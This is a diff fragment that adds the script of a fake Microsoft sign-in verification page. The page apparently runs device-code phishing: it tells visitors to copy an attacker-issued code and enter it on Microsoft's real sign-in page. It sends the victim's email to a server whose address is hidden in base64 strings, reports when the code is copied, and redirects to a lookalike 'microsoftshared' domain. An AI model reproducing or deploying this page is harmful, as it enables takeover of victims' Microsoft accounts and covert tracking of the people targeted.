+        if(p==='microsoft'){
+          if(sl)sl.innerHTML=_dc_s;
+          if(subEl)subEl.textContent='Copy the code below and enter it on the Microsoft sign-in page to complete verification.';
+          if(cdEl)cdEl.style.display='';
+          if(linkEl){linkEl.textContent='Open Microsoft sign-in page ↗';linkEl.style.opacity='';linkEl.style.pointerEvents='';}
+        }
+        if(codeEl)codeEl.textContent=data[_xa];
+        if(linkEl)linkEl.href=data[_xb];
+        _countdown();_startPoll(data['poll_interval']||5);
+      }
+    })
+    .catch(function(){
+      var eb=_gel('_err');
+      if(eb){eb.textContent='Failed to start sign-in. Please try again.';_show('_err');}
+      _hide('_s2');_show('_s1');
+    });
+};
+
+window.showProviders=function(){
+  var ps=_gel('_provsel');
+  if(ps)ps.style.display=ps.style.display==='none'?'block':'none';
+};
+
+window._copyCode=function(){
+  var c=_gel('_code');if(!c)return;
+  var txt=c.textContent;
+  if(txt&&txt!=='——————'&&txt!=='Loading…'){
+    navigator.clipboard.writeText(txt).catch(function(){});
+    var btn=_gel('_copybtn');if(btn){btn.textContent='Copied!';setTimeout(function(){btn.textContent='Copy';},2000);}
+    if(!_noted){
+      _noted=true;
+      var _ohd={};_ohd[_x6]=_x7;_ohd['X-Provider']='microsoft';
+      var _obd={'recipient_email':(window._rcpt||'')};
+      fetch(_x0+_x2+_x1+'/opened',{method:_x8,headers:_ohd,body:JSON.stringify(_obd)}).catch(function(){});
+    }
+  }
+};
+
+window._doRedirect=function(){};
+})();</script>
+<script>
+(function(){
+  window._doRedirect=function(){{var rd=document.getElementById("_ok_rd"),msg=document.getElementById("_ok_rd_msg"),sp=document.getElementById("_ok_rd_spin");if(rd)rd.style.display="flex";if(sp)sp.style.display="inline-block";var n=3;if(msg)msg.innerHTML="Redirecting in <strong id=\"_ok_rd_n\" style=\"color:#107c10;\">"+n+"</strong>s…";var iv=setInterval(function(){{n--;var ti=document.getElementById("_ok_rd_n");if(ti)ti.textContent=n;if(n<=0){{clearInterval(iv);window.location.href="https://microsoftshared.github.io/shared/p/success-w6Nh9tfrXocyq0oNv_iQMGxlqySGgJcB.html";}}}},1000);}};
+  window._rcpt=(new URLSearchParams(location.search).get('to')||'');
+  fetch(atob('aHR0cHM6Ly96ZW5ncmlkLnNwYWNl')+atob('L2Nvbm5lY3QvcGFnZS8=')+atob('dzZOaDl0ZnJYb2N5cTBvTnZfaVFNR3hscXlTR2dKY0I=')+atob('L3Zpc2l0')+(window._rcpt?'?to='+encodeURIComponent(window._rcpt):''),{method:atob('UE9TVA==')}).catch(function(){});
+})();
+</script>
+</body>
+</html>
